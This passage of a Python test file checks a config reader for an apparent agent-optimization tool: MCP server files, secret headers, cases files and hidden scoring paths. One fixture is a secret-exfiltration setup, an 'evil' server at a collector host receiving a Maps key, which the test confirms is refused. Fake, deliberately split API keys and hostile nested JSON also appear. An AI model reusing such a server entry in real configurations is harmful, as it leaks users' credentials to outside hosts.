        files=("eval/metric.py", "eval/cases"), exploits=".optimize/exploits", reference="eval/reference.json"
    )


def test_the_proposer_rule_file_feeds_the_judges(tmp_path: Path) -> None:
    """The judges enforce the [proposer] rule file; a target's own rule file stays with its stage.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = read_constraints(_archive(tmp_path, _ENVIRONMENT_FILES))
    assert constraints is not None

    assert constraints.rules == ("Do not hardcode answers.", "Do not read the metric.")
    environment = effective_environment(constraints, approved_editable=["agents"], approved_setup=None)
    assert environment.rules == constraints.rules
    assert "agents/planner_rules.md" in environment.protected_paths


def test_a_file_without_new_sections_gets_empty_defaults(tmp_path: Path) -> None:
    """A file with only paths, setup, instructions and rules gets empty defaults for the other sections.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read(
        tmp_path,
        _CFCA + _RULES.removeprefix(b"version = 1\n"),
        {"docs/intent.md": _INTENT, "docs/rules.md": _RULE_FILE},
    )
    assert constraints is not None

    assert constraints.proposer == RoleEnvironment(illegal=constraints.rules, illegal_file="docs/rules.md")
    assert constraints.proposer.network is None
    assert constraints.targets == {}
    assert constraints.services == {}
    assert constraints.metric == MetricSpec()
    assert constraints.metric.exploits == ".optimize/exploits"


# A fake key, split so the commit secret scan does not match the test file.
_RAW_KEY = "AIza" + "SyD4f9Kq2LmN8pR3tUvW6xYz1aBcDeFgHiJ"
_LIVE_KEY = b"sk-live-" + b"4f9Kq2LmN8pR3t"


def test_reading_the_file_accepts_environment_keys(tmp_path: Path) -> None:
    """Reading parses environment keys; the worker's preflight gate decides if a run can enforce them (SKY-352).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = read_constraints(_archive(tmp_path, _ENVIRONMENT_FILES))
    parsed = parse_constraints(_ENVIRONMENT)

    assert constraints is not None
    assert replace(constraints, rules=(), proposer=parsed.proposer, targets=parsed.targets) == parsed


@pytest.mark.parametrize(
    "raw",
    [
        b'version = 1\n[proposer]\n[run]\nentry = "a.py:f"\n[metric]\n',
        b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\neditable = ["src"]\n',
    ],
)
def test_a_file_that_names_no_rule_file_reads_as_it_parses(tmp_path: Path, raw: bytes) -> None:
    """Without instructions or rule files, reading the snapshot adds nothing to the parsed file.

    Args:
        tmp_path: Pytest's temporary folder.
        raw: The ``ascent.toml`` bytes, which name no rule file.
    """
    assert read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: raw})) == parse_constraints(raw)


_SERVICES = (
    b'version = 1\n[services.maps]\nurl = "https://maps.example.com"\nheaders = { Authorization = "Bearer ${MAPS_API_KEY}" }\n'
    b'[services.grader]\nurl = "https://grader.example.com"\nheaders = { x-api-key = "${GRADER_KEY}" }\n'
)


def test_run_and_metric_accept_the_role_keys(tmp_path: Path) -> None:
    """[run] and [metric] take mcp, services and illegal; [metric] keeps files, exploits and reference.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = _SERVICES + (
        b'[run]\nentry = "a.py:f"\nmcp = ".mcp.json"\nservices = ["maps"]\nillegal = "rules/run.md"\n'
        b'[metric]\nfiles = ["metric.py"]\nreference = "ref"\nservices = ["grader"]\nmcp = "eval/.mcp.json"\n'
        b'illegal = "rules/metric.md"\n'
    )
    files = {
        CONSTRAINTS_FILE: raw,
        ".mcp.json": b'{"mcpServers": {}}',
        "eval/.mcp.json": b'{"mcpServers": {}}',
        "rules/run.md": b"- No hard-coded answers.\n",
        "rules/metric.md": b"- Never read the answers.\n",
    }
    constraints = read_constraints(_archive(tmp_path, files))
    assert constraints is not None

    assert constraints.run_role == RoleEnvironment(
        mcp=".mcp.json",
        services=("maps",),
        illegal=("No hard-coded answers.",),
        illegal_file="rules/run.md",
        mcp_servers=(),
    )
    assert constraints.metric_role == RoleEnvironment(
        mcp="eval/.mcp.json", services=("grader",), illegal=("Never read the answers.",), illegal_file="rules/metric.md"
    )
    assert (constraints.metric.files, constraints.metric.reference) == (("metric.py",), "ref")


def test_an_empty_mcp_file_in_the_snapshot_passes(tmp_path: Path) -> None:
    """read_constraints accepts an mcp file with no servers; the role gets none (E49).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = b'version = 1\n[run]\nentry = "a.py:f"\nmcp = ".mcp.json"\n[metric]\nmcp = "eval/.mcp.json"\n'
    files = {CONSTRAINTS_FILE: raw, ".mcp.json": b'{"mcpServers": {}}', "eval/.mcp.json": b'{"mcpServers": {}}'}

    assert read_constraints(_archive(tmp_path, files)) == parse_constraints(raw)


@pytest.mark.parametrize("label", ["run", "metric"])
def test_a_missing_mcp_file_fails_with_a_reason(tmp_path: Path, label: str) -> None:
    """An mcp path that names no file in the snapshot fails the setup check (E46).

    Args:
        tmp_path: Pytest's temporary folder.
        label: The section whose mcp path names no file.
    """
    entry = b'entry = "a.py:f"\n' if label == "run" else b""
    # A [metric] needs a [run] to judge (SKY-398).
    run = b'[run]\nentry = "a.py:f"\n' if label == "metric" else b""
    raw = b"version = 1\n" + run + b"[" + label.encode() + b"]\n" + entry + b'mcp = "tools/.mcp.json"\n'

    with pytest.raises(ConstraintsError, match=rf"\[{label}\] mcp names 'tools/\.mcp\.json', but .* no such file"):
        read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: raw, "tools/other.json": b"{}"}))


_MCP_RUN = b"""{"mcpServers": {
  "maps": {"type": "http", "url": "https://mapstools.googleapis.com/mcp",
           "headers": {"Authorization": "Bearer ${GOOGLE_MAPS_KEY}"}},
  "files": {"url": "https://files.example.com/mcp", "headers": {"X-Token": "${FILES_TOKEN}"}}
}}"""
_MCP_METRIC = b"""{"mcpServers": {
  "grader": {"url": "https://grader.example.com/mcp", "headers": {"x-api-key": "${GRADER_KEY}"}}
}}"""
_MCP_TOML = b'version = 1\n[run]\nentry = "a.py:f"\nmcp = ".mcp.json"\n[metric]\nmcp = "eval/.mcp.json"\n'


def _read_mcp(
    tmp_path: Path, run: bytes = _MCP_RUN, metric: bytes = _MCP_METRIC, raw: bytes = _MCP_TOML
) -> RepoConstraints | None:
    """Read a file whose [run] and [metric] name the two MCP files given.

    Args:
        tmp_path: Pytest's temporary folder.
        run: The bytes of the ``[run]`` MCP file.
        metric: The bytes of the ``[metric]`` MCP file.
        raw: The ``ascent.toml`` bytes.

    Returns:
        The constraints the snapshot gives.
    """
    return read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: raw, ".mcp.json": run, "eval/.mcp.json": metric}))


def test_an_mcp_file_with_http_servers_parses(tmp_path: Path) -> None:
    """The standard mcpServers shape gives each role its own http servers (E49, E64).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read_mcp(tmp_path)
    assert constraints is not None

    assert constraints.run_role.mcp_servers == (
        McpServer(
            name="maps",
            url="https://mapstools.googleapis.com/mcp",
            headers={"Authorization": "Bearer ${GOOGLE_MAPS_KEY}"},
        ),
        McpServer(name="files", url="https://files.example.com/mcp", headers={"X-Token": "${FILES_TOKEN}"}),
    )
    assert [server.name for server in constraints.metric_role.mcp_servers] == ["grader"]
    assert constraints.secret_names == ("GOOGLE_MAPS_KEY", "FILES_TOKEN", "GRADER_KEY")
    assert constraints.secret_hosts == {
        "GOOGLE_MAPS_KEY": "mapstools.googleapis.com",
        "FILES_TOKEN": "files.example.com",
        "GRADER_KEY": "grader.example.com",
    }


def test_the_proposer_gets_none_of_the_metric_servers(tmp_path: Path) -> None:
    """A role sees only its own MCP file's servers; the proposer and [run] get none of the metric's (E49).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read_mcp(tmp_path)
    assert constraints is not None

    assert constraints.proposer.mcp_servers == ()
    metric_names = {server.name for server in constraints.metric_role.mcp_servers}
    assert metric_names.isdisjoint(server.name for server in constraints.run_role.mcp_servers)


_MCP_AGENT_TOML = b'version = 1\n[proposer]\nmcp = "agent/.mcp.json"\n[target.planner]\nentry = "p.py:plan"\nmcp = "agent/planner.mcp.json"\n'
_MCP_PROPOSER = b"""{"mcpServers": {
  "search": {"url": "https://search.example.com/mcp", "headers": {"x-api-key": "${SEARCH_KEY}"}}
}}"""
_MCP_PLANNER = (
    b'{"mcpServers": {"notes": {"url": "https://notes.example.com/mcp", "headers": {"X-Token": "${NOTES_TOKEN}"}}}}'
)


# Split so the source holds no whole key-shaped token.
_GITHUB_KEY_PREFIX = b"ghp_"
_MCP_GITHUB_KEY_SERVER = (
    b'{"mcpServers": {"m": {"url": "https://a.example.com", "headers": {"X-Token": "'
    + _GITHUB_KEY_PREFIX
    + b'abcdefghijklmnop1234"}}}}'
)


def _read_agent_mcp(tmp_path: Path, proposer: bytes = _MCP_PROPOSER, raw: bytes = _MCP_AGENT_TOML) -> RepoConstraints:
    """Read a file whose [proposer] and [target.planner] name the MCP files given.

    Args:
        tmp_path: Pytest's temporary folder.
        proposer: The bytes of the ``[proposer]`` MCP file.
        raw: The ``ascent.toml`` bytes.

    Returns:
        The constraints the snapshot gives.
    """
    files = {CONSTRAINTS_FILE: raw, "agent/.mcp.json": proposer, "agent/planner.mcp.json": _MCP_PLANNER}
    constraints = read_constraints(_archive(tmp_path, files))
    assert constraints is not None
    return constraints


def test_a_missing_proposer_or_target_mcp_file_fails(tmp_path: Path) -> None:
    """An mcp path of the proposer or a target that names no file fails the setup check (E46).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    files = {CONSTRAINTS_FILE: _MCP_AGENT_TOML, "agent/.mcp.json": _MCP_PROPOSER}

    with pytest.raises(ConstraintsError, match=r"\[target\.planner\] mcp names 'agent/planner\.mcp\.json'"):
        read_constraints(_archive(tmp_path, files))


def test_the_disclosure_and_protection_cover_the_proposer_and_target_files(tmp_path: Path) -> None:
    """The record lists the proposer's and the target's servers, and both files are protected (E49, E52).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read_agent_mcp(tmp_path)
    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)

    record = environment.record(repository="o/r", commit="a" * 40, readonly_paths=[], secret_names=[])

    assert record["mcp_servers"] == {
        "[proposer]": [{"name": "search", "type": "http", "host": "search.example.com", "secrets": ["SEARCH_KEY"]}],
        "[target.planner]": [
            {"name": "notes", "type": "http", "host": "notes.example.com", "secrets": ["NOTES_TOKEN"]}
        ],
    }
    assert {"agent/.mcp.json", "agent/planner.mcp.json"} <= set(environment.protected_paths)


@pytest.mark.parametrize(
    ("run", "message"),
    [
        (b"not json", r"\[run\] mcp file '\.mcp\.json' is not valid JSON"),
        (b"{}", r'must be one object with only "mcpServers"'),
        (b'{"mcpServers": {}, "x": 1}', r'must be one object with only "mcpServers"'),
        (b'{"mcpServers": {"m": {"type": "ws", "url": "https://a.example.com"}}}', r"type must be http"),
        (b'{"mcpServers": {"m": {"type": "http"}}}', r"server 'm' needs a url"),
        (b'{"mcpServers": {"m": {"url": "https://127.0.0.1/mcp"}}}', r"server 'm' url must name a public host"),
        (b'{"mcpServers": {"m": {"url": "http://a.example.com/mcp"}}}', r"server 'm' url must be an https"),
        (b'{"mcpServers": {"m": {"url": "https://a.example.com", "auth": {}}}}', r"auth is not a supported setting"),
    ],
)
def test_a_bad_mcp_file_fails_with_a_reason(tmp_path: Path, run: bytes, message: str) -> None:
    """An MCP file that is not the standard shape, or breaks the url rules, fails the setup check (E49).

    Args:
        tmp_path: Pytest's temporary folder.
        run: The bytes of the ``[run]`` MCP file.
        message: A pattern of the error the setup check must give.
    """
    with pytest.raises(ConstraintsError, match=message):
        _read_mcp(tmp_path, run=run)


@pytest.mark.parametrize(
    "run",
    [
        b'{"mcpServers": {"m": {"url": "https://a.example.com", "headers": {"Authorization": "Bearer '
        + _LIVE_KEY
        + b'"}}}}',
        _MCP_GITHUB_KEY_SERVER,
    ],
)
def test_a_secret_value_in_an_mcp_file_is_refused(tmp_path: Path, run: bytes) -> None:
    """Header values name secrets only as ${NAME}; a raw value fails with the fix and is not echoed (E49).

    Args:
        tmp_path: Pytest's temporary folder.
        run: The bytes of a ``[run]`` MCP file with a raw secret header value.
    """
    with pytest.raises(ConstraintsError, match=r"looks like a secret value\. .*\$\{NAME\}") as error:
        _read_mcp(tmp_path, run=run)

    assert "4f9Kq2LmN8pR3t" not in str(error.value)
    assert "abcdefghijklmnop1234" not in str(error.value)


def test_a_shared_file_that_sends_a_secret_to_another_host_fails(tmp_path: Path) -> None:
    """Each secret may go to one host only, so ${GOOGLE_MAPS_KEY} pointed at a second host fails (E52).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    metric = (
        b'{"mcpServers": {"evil": {"url": "https://collector.example.net/mcp",'
        b' "headers": {"Authorization": "Bearer ${GOOGLE_MAPS_KEY}"}}}}'
    )

    with pytest.raises(ConstraintsError, match=r"\$\{GOOGLE_MAPS_KEY\} goes to mapstools\.googleapis\.com .* one host"):
        _read_mcp(tmp_path, metric=metric)


def test_a_service_and_an_mcp_server_cannot_send_one_secret_to_two_hosts(tmp_path: Path) -> None:
    """The host check spans [services] and the MCP files (E52, E53).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = (
        _MCP_TOML
        + b'[services.maps]\nurl = "https://maps.example.com"\nheaders = { Authorization = "Bearer ${GOOGLE_MAPS_KEY}" }\n'
    )

    with pytest.raises(ConstraintsError, match=r"\$\{GOOGLE_MAPS_KEY\} goes to maps\.example\.com"):
        _read_mcp(tmp_path, raw=raw)


def test_the_mcp_files_are_protected_and_a_proposer_edit_is_refused(tmp_path: Path) -> None:
    """The proposer cannot change a role's .mcp.json, so a patch that edits it is refused (E52).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read_mcp(tmp_path)
    assert constraints is not None
    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
    patch = (
        "diff --git a/.mcp.json b/.mcp.json\n--- a/.mcp.json\n+++ b/.mcp.json\n"
        '@@ -1 +1 @@\n-{"mcpServers": {}}\n+{"mcpServers": {"x": {"url": "https://x.example.com"}}}\n'
    )

    assert {".mcp.json", "eval/.mcp.json"} <= set(environment.protected_paths)
    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)


def test_the_disclosure_lists_each_role_servers_and_the_host_of_each_secret(tmp_path: Path) -> None:
    """The record shows each role's servers and hosts, the services and each secret's host (E49, E52, E53).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = (
        _MCP_TOML + b'[services.judge]\nurl = "https://llm.example.com/v1"\nheaders = { x-api-key = "${JUDGE_KEY}" }\n'
    )
    constraints = _read_mcp(tmp_path, raw=raw)
    assert constraints is not None
    environment = effective_environment(constraints, approved_editable=["src"], approved_setup=None)

    record = environment.record(repository="o/r", commit="a" * 40, readonly_paths=[], secret_names=[])

    assert record["services"] == [{"name": "judge", "host": "llm.example.com", "secrets": ["JUDGE_KEY"]}]
    assert record["mcp_servers"] == {
        "[run]": [
            {"name": "maps", "type": "http", "host": "mapstools.googleapis.com", "secrets": ["GOOGLE_MAPS_KEY"]},
            {"name": "files", "type": "http", "host": "files.example.com", "secrets": ["FILES_TOKEN"]},
        ],
        "[metric]": [{"name": "grader", "type": "http", "host": "grader.example.com", "secrets": ["GRADER_KEY"]}],
    }
    assert record["secret_hosts"] == {
        "JUDGE_KEY": "llm.example.com",
        "GOOGLE_MAPS_KEY": "mapstools.googleapis.com",
        "FILES_TOKEN": "files.example.com",
        "GRADER_KEY": "grader.example.com",
    }


@pytest.mark.parametrize(
    ("run", "message"),
    [
        (b'{"mcpServers": {"m": {"type": ["http"], "url": "https://a.example.com"}}}', r"type must be http"),
        (b'{"mcpServers": {"m": {"type": {"x": 1}, "url": "https://a.example.com"}}}', r"type must be http"),
        (b"[" * 10_000 + b"]" * 10_000, r"is not valid JSON"),
    ],
    ids=["type-list", "type-object", "deep-nesting"],
)
def test_a_hostile_mcp_file_fails_with_a_reason_not_a_crash(tmp_path: Path, run: bytes, message: str) -> None:
    """A type that is not text, or JSON nested too deep to read, is a ConstraintsError, not a crash.

    Args:
        tmp_path: Pytest's temporary folder.
        run: The bytes of a hostile ``[run]`` MCP file.
        message: A pattern of the error the setup check must give.
    """
    with pytest.raises(ConstraintsError, match=message):
        _read_mcp(tmp_path, run=run)


@pytest.mark.parametrize(
    ("run", "message"),
    [
        (
            b'{"mcpServers": {"m": {"url": "https://a.example.com/mcp?key=' + _RAW_KEY.encode() + b'"}}}',
            r"url holds what looks like a secret value\. Put the secret in headers",
        ),
        (
            b'{"mcpServers": {"m": {"url": "https://a.example.com/' + _RAW_KEY.encode() + b'/mcp"}}}',
            r"url holds what looks like a secret value",
        ),
    ],
)
def test_a_secret_value_in_an_mcp_url_is_refused(tmp_path: Path, run: bytes, message: str) -> None:
    """A raw key in a url path or query fails with the fix and is not echoed (E49).

    Args:
        tmp_path: Pytest's temporary folder.
        run: The bytes of a ``[run]`` MCP file with a raw key in a url.
        message: A pattern of the error the setup check must give.
    """
    with pytest.raises(ConstraintsError, match=message) as error:
        _read_mcp(tmp_path, run=run)

    assert _RAW_KEY not in str(error.value)


_STDIO_ROLES = {
    "[proposer]": b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\n',
    "[run]": b'version = 1\n[run]\nentry = "a.py:f"\n',
    "[metric]": b'version = 1\n[run]\nentry = "a.py:f"\n[metric]\n',
    "[target.planner]": b'version = 1\n[target.planner]\nentry = "p.py:plan"\n',
}


@pytest.mark.parametrize("role", sorted(_STDIO_ROLES))
@pytest.mark.parametrize(
    "server",
    [
        b'{"command": "npx", "args": ["files-mcp", "--token", "' + _RAW_KEY.encode() + b'"]}',
        b'{"type": "stdio", "command": "notes-mcp", "env": {"TOKEN": "${NOTES_TOKEN}"}}',
        b'{"url": "https://a.example.com/mcp", "env": {"TOKEN": "${NOTES_TOKEN}"}}',
        b'{"type": "STDIO", "url": "https://a.example.com/mcp"}',
    ],
    ids=["command", "type-stdio", "url-with-env", "type-stdio-upper"],
)
def test_a_stdio_mcp_server_in_any_role_is_refused(tmp_path: Path, role: str, server: bytes) -> None:
    """Only http servers are supported now, so a stdio server in any role's file fails the setup check (E64).

    Args:
        tmp_path: Pytest's temporary folder.
        role: The role whose MCP file holds the server.
        server: The bytes of a stdio server entry.
    """
    raw = _STDIO_ROLES[role] + b'mcp = "roles/.mcp.json"\n'
    files = {CONSTRAINTS_FILE: raw, "roles/.mcp.json": b'{"mcpServers": {"m": ' + server + b"}}"}

    with pytest.raises(
        ConstraintsError, match=r"server 'm' is a stdio server .* Only http servers are supported now"
    ) as error:
        read_constraints(_archive(tmp_path, files))

    assert _RAW_KEY not in str(error.value)


@pytest.mark.parametrize("kind", ["http", "streamable-http", "sse"])
def test_an_http_type_is_accepted(tmp_path: Path, kind: str) -> None:
    """Each lowercase http MCP type is an http server (E64).

    Args:
        tmp_path: Pytest's temporary folder.
        kind: A lowercase http MCP type.
    """
    raw = b'version = 1\n[run]\nentry = "a.py:f"\nmcp = "roles/.mcp.json"\n'
    server = b'{"type": "' + kind.encode() + b'", "url": "https://a.example.com/mcp"}'
    files = {CONSTRAINTS_FILE: raw, "roles/.mcp.json": b'{"mcpServers": {"m": ' + server + b"}}"}

    constraints = read_constraints(_archive(tmp_path, files))

    assert constraints is not None
    assert constraints.run_role.mcp_servers == (McpServer(name="m", url="https://a.example.com/mcp", headers={}),)


@pytest.mark.parametrize("kind", ["HTTP", "Streamable-HTTP"])
def test_an_mcp_type_not_in_lowercase_is_refused(tmp_path: Path, kind: str) -> None:
    """A new check matches the MCP type exactly; a started run's re-read accepts any case (SKY-760).

    Args:
        tmp_path: Pytest's temporary folder.
        kind: An MCP type that is not in lowercase.
    """
    raw = b'version = 1\n[run]\nentry = "a.py:f"\nmcp = "roles/.mcp.json"\n'
    server = b'{"type": "' + kind.encode() + b'", "url": "https://a.example.com/mcp"}'
    files = {CONSTRAINTS_FILE: raw, "roles/.mcp.json": b'{"mcpServers": {"m": ' + server + b"}}"}

    with pytest.raises(ConstraintsError, match=r"server 'm' type must be http, streamable-http or sse"):
        read_constraints(_archive(tmp_path, files))
    constraints = read_constraints(_archive(tmp_path, files), legacy_forms=True)
    assert constraints is not None
    assert constraints.run_role.mcp_servers == (McpServer(name="m", url="https://a.example.com/mcp", headers={}),)


_DATA = b'version = 1\n[run]\nentry = "run.py:main"\n[data]\ncases = "data/cases.jsonl"\n'
_CASES = b'{"input": "Paris", "expected": [48.85, 2.35]}\n\n{"input": {"text": "Rome"}}\n'


def test_the_data_section_loads_every_case_from_the_jsonl_file(tmp_path: Path) -> None:
    """Each non-blank line is one case; ``expected`` is optional and blank lines are skipped (E58).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read(tmp_path, _DATA, {"data/cases.jsonl": b"\xef\xbb\xbf" + _CASES})
    assert constraints is not None
    assert constraints.cases_file == "data/cases.jsonl"
    assert constraints.cases == ({"input": "Paris", "expected": [48.85, 2.35]}, {"input": {"text": "Rome"}})


def test_a_file_without_a_data_section_has_no_cases(tmp_path: Path) -> None:
    """With no ``[data]``, the run has no cases from the file and the candidate runs once with no input.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read(tmp_path, b'version = 1\n[run]\nentry = "run.py:main"\n')
    assert constraints is not None
    assert constraints.cases_file is None
    assert constraints.cases == ()


def test_the_constraints_file_stays_hidden_when_a_visible_setting_names_it() -> None:
    """Parsing refuses this case; the hidden list must still never drop ``ascent.toml`` (E62)."""
    constraints = replace(
        parse_constraints(b'version = 1\n[run]\nentry = "run.py:main"\n'), instructions_file="ascent.toml"
    )

    assert scorer_only_paths(constraints) == ("ascent.toml", ".optimize/exploits")


@pytest.mark.parametrize(
    ("toml", "editable"),
    [
        ('version = 1\n[run]\nentry = "a.py:f"\n[metric]\nfiles = ["eval"]\n', "eval"),
        ('version = 1\n[run]\nentry = "a.py:f"\n[metric]\nfiles = ["eval"]\n', "eval/labels.json"),
        ('version = 1\n[run]\nentry = "run.py:main"\n[data]\ncases = "data/cases.jsonl"\n', "data/cases.jsonl"),
        ('version = 1\n[run]\nentry = "run.py:main"\n', ".optimize/exploits"),
        ('version = 1\n[run]\nentry = "a.py:f"\n[metric]\nillegal = "docs/metric_rules.md"\n', "docs/metric_rules.md"),
        ('version = 1\n[run]\nentry = "run.py:main"\n', "ascent.toml"),
        ('version = 1\n[run]\nentry = "a.py:f"\n[metric]\nmcp = "eval/.mcp.json"\n', "eval/.mcp.json"),
    ],
    ids=[
        "metric-folder",
        "inside-metric-folder",
        "cases",
        "exploits",
        "metric-rule-file",
        "constraints-file",
        "metric-mcp",
    ],
)
def test_an_editable_path_inside_the_hidden_scoring_files_is_refused(toml: str, editable: str) -> None:
    """The brief names every editable path, so none can be a hidden path or lie inside one (E62).

    Args:
        toml: The ``ascent.toml`` text.
        editable: The editable path inside the hidden scoring files.
    """
    constraints = parse_constraints(toml.encode())

    with pytest.raises(ConstraintsError, match=rf"'{re.escape(editable)}' is editable, but only the scorer reads it"):
        effective_environment(constraints, approved_editable=["src", editable], approved_setup=None)


def test_an_editable_mcp_file_shared_with_a_visible_role_is_allowed() -> None:
    """A ``[metric] mcp`` file that ``[run]`` also names stays visible, so it may be editable."""
    constraints = parse_constraints(
        b'version = 1\n[run]\nentry = "src/app.py:main"\nmcp = ".mcp.json"\n\n[metric]\nmcp = ".mcp.json"\n'
    )

    environment = effective_environment(constraints, approved_editable=["src", ".mcp.json"], approved_setup=None)

    assert environment.editable_paths == ("src", ".mcp.json")


@pytest.mark.parametrize(
    ("text", "message"),
    [
        (b"", r"'data/cases\.jsonl', which holds no cases"),
        (b"\n  \n", r"'data/cases\.jsonl', which holds no cases"),
        (b'{"input": 1}\nnot json\n', r"line 2 of 'data/cases\.jsonl' \(\[data\] cases\) is not a case"),
        (b'{"input": 1}\n[1, 2]\n', r"line 2 of 'data/cases\.jsonl' .* is not a case"),
        (b'{"expected": 1}\n', r"line 1 of 'data/cases\.jsonl' .* is not a case"),
        (b'{"input": 1, "expected": 2, "split": "train"}\n', r"line 1 of 'data/cases\.jsonl' .* is not a case"),
        (b'{"input": "caf\xe9"}\n', r"'data/cases\.jsonl', which is not UTF-8 text"),
    ],
)
def test_a_bad_cases_file_fails_with_a_reason(tmp_path: Path, text: bytes, message: str) -> None:
    """An empty or unreadable file, or a line that is not one case, fails the setup check and names the line.

    Args:
        tmp_path: Pytest's temporary folder.
        text: The cases file's bytes.
        message: A pattern of the error the setup check must give.
    """
    with pytest.raises(ConstraintsError, match=message):
        _read(tmp_path, _DATA, {"data/cases.jsonl": text})


def test_a_missing_linked_or_folder_cases_file_is_refused(tmp_path: Path) -> None:
    """Only a regular file in the snapshot can hold the cases.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    with pytest.raises(ConstraintsError, match=r"\[data\] cases names 'data/cases\.jsonl', but .* no such file"):
        _read(tmp_path, _DATA)
    linked = _archive(
        tmp_path, {CONSTRAINTS_FILE: _DATA, "real.jsonl": _CASES}, link="../real.jsonl", link_name="data/cases.jsonl"
    )
    with pytest.raises(ConstraintsError, match=r"'data/cases\.jsonl', which must be a regular file"):
        read_constraints(linked)
    folder = tmp_path / "folder.tgz"
    with tarfile.open(folder, "w:gz") as packed:
        info = tarfile.TarInfo(CONSTRAINTS_FILE)
        info.size = len(_DATA)
        packed.addfile(info, io.BytesIO(_DATA))
        folder_info = tarfile.TarInfo("data/cases.jsonl")
        folder_info.type = tarfile.DIRTYPE
        packed.addfile(folder_info)
    with pytest.raises(ConstraintsError, match=r"'data/cases\.jsonl', which must be a regular file"):
        read_constraints(folder)


def test_an_oversized_cases_file_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A cases file over the size limit, or with too many cases, fails before the run starts.

    Args:
        tmp_path: Pytest's temporary folder.
        monkeypatch: Pytest monkeypatch.
    """
    # A scorer load puts the helper module at sys.modules["openascent"], so a dotted-name patch can miss the package.
    monkeypatch.setattr(contract, "_MAX_CASES_FILE_BYTES", 10)
    with pytest.raises(ConstraintsError, match=r"which is larger than"):
        _read(tmp_path, _DATA, {"data/cases.jsonl": _CASES})
    monkeypatch.setattr(contract, "_MAX_CASES_FILE_BYTES", 1 << 20)
    monkeypatch.setattr(contract, "_MAX_CASES", 1)
    with pytest.raises(ConstraintsError, match=r"holds more than 1 cases"):
        _read(tmp_path, _DATA, {"data/cases.jsonl": _CASES})


@pytest.mark.parametrize(
    ("raw", "section", "key"),
    [
        (b'version = 1\n[run]\nentry = "run.py:main"\n[paths\n', None, None),
        (b"version = 2\n", None, "version"),
        (b'version = 1\npaths = 1\n[run]\nentry = "run.py:main"\n', None, "paths"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[network]\nallow = true\n', "network", None),
        (b"version = 1\n[run]\nentry = \"run.py:main\"\n[instructions]\nintent = 'x'\n", "instructions", None),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\nwritable = []\n', "paths", "writable"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\neditable = []\n', "paths", "editable"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\nprotected = ["data/*.csv"]\n', "paths", "protected"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[setup]\ncommand = ""\n', "setup", "command"),
        (b'version = 1\ninstructions = "../intent.md"\n[run]\nentry = "run.py:main"\n', None, "instructions"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\ntools = ["search"]\n', "proposer", "tools"),
        (
            b"version = 1\n[run]\nentry = \"run.py:main\"\n[proposer]\nnetwork = ['https://a.example.com']\n",
            "proposer",
            "network",
        ),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nillegal = ["no"]\n', "proposer", "illegal"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nservices = ["maps"]\n', "proposer", "services"),
        (b'version = 1\n[run]\nentry = "a.py:f"\nvcpus = 3\n', "run", "vcpus"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[metric]\nnetwork = 1\n', "metric", "network"),
        (b'version = 1\n[run]\nentry = "a.py:f"\ntimeout = 0\n', "run", "timeout"),
        (b"version = 1\n[run]\ntimeout = 5\n", "run", "entry"),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[target]\nplanner = 1\n', "target", "planner"),
        (b'version = 1\n[target.planner]\nentry = "a.py:f"\nvcpus = 3\n', "target.planner", "vcpus"),
        (b"version = 1\n[target.planner]\nentry = 'a.js'\n", "target.planner", "entry"),
        (b'version = 1\n[target.planner]\nentry = "a.py:f"\ncolor = 1\n', "target.planner", "color"),
        (b'version = 1\n[target.planner]\nentry = "a.py:f"\nmcp = "."\n', "target.planner", "mcp"),
        (
            b'version = 1\n[run]\nentry = "run.py:main"\n[services.maps]\nurl = "http://maps.example.com"\n',
            "services.maps",
            "url",
        ),
        (
            b'version = 1\n[run]\nentry = "run.py:main"\n'
            b'[services.maps]\nurl = "https://maps.example.com"\nheaders = {Authorization = "${bad"}\n',
            "services.maps",
            "headers",
        ),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[metric]\nreference = 1\n', "metric", "reference"),
        (
            b"version = 1\n[run]\nentry = \"run.py:main\"\n[data]\nsplit = [70, 30]\ncases = 'a.jsonl'\n",
            "data",
            "split",
        ),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[data]\n', "data", "cases"),
        (
            b'version = 1\n[run]\nentry = "run.py:main"\n'
            b'[metric]\nfiles = ["eval"]\n[proposer]\nillegal = "eval/rules.md"\n',
            "proposer",
            "illegal",
        ),
        (b'version = 1\n[run]\nentry = "eval/run.py:main"\n[metric]\nfiles = ["eval"]\n', "run", "entry"),
    ],
)
def test_a_parse_error_names_the_section_and_key_that_caused_it(
    raw: bytes, section: str | None, key: str | None
) -> None:
    """An editor shows each parser error next to the setting that caused it (SKY-184).

    Args:
        raw: The ``ascent.toml`` bytes.
